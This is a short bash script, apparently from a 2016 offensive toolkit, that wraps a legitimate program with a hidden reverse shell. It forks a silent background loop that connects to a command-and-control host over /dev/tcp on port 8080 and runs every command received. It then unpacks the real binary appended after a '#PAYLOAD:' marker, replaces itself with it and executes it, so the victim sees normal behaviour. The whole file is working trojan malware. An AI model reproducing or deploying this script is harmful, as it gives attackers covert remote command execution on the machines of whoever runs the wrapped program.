#!/bin/bash
# Copyright terabit 2016
# Copyright kaneda  2016
#
# Last updated: 2016-04-07
# Description: Reverse shell, 172.16.10.250 will be replaced by
#              the IP of your command and control server, i.e.
#              on the cnc: nc -vvvlp 8080
iPWD=$PWD
ME="MYPATH"
BINARY_PATH=$iPWD"/$ME"
relative_path=$(dirname "$0");

#above lines must remain first!

function loop_de_loop {
    while true; do
        sleep 3
        exec 5<>/dev/tcp/REPLACEME/8080
        cat <&5 | while read line; do
            $line 2>&5 >&5
        done
    done
}

function le_fork {
    loop_de_loop > /dev/null 2>&1
}

le_fork &

match=$(grep --text --line-number '^#PAYLOAD:$' $0 | cut -d ':' -f 1)
payload_start=$((match + 1))
BINARY_PATH=$relative_path/"$ME"

touch $BINARY_PATH".out"
tail -n +$payload_start $BINARY_PATH >> $BINARY_PATH".out"
diff $BINARY_PATH $BINARY_PATH".out"
rm $BINARY_PATH
mv $BINARY_PATH".out" $BINARY_PATH
chmod a+x $BINARY_PATH
eval $BINARY_PATH $@
exit 0

